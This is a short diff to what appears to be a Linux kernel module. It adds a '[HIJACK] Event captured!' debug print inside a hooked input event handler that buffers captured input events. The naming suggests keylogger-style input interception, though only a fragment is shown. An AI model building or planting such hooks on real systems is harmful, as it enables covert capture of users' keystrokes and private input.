@@ -46,8 +46,11 @@ void our_hooked_event_handler(struct input_handle *handle, unsigned int type, un
 {
     unsigned long flags;
 
+    PRINT_DEBUG("[HIJACK] Event captured! type=%u, code=%u, value=%d\n", type, code, value);
+
     // 1. Lock the buffer
     spin_lock_irqsave(&buffer_lock, flags);
+
 
     // 2. Check if the buffer is full
     if (event_buffer.count < MAX_EVENTS_PER_READ) {
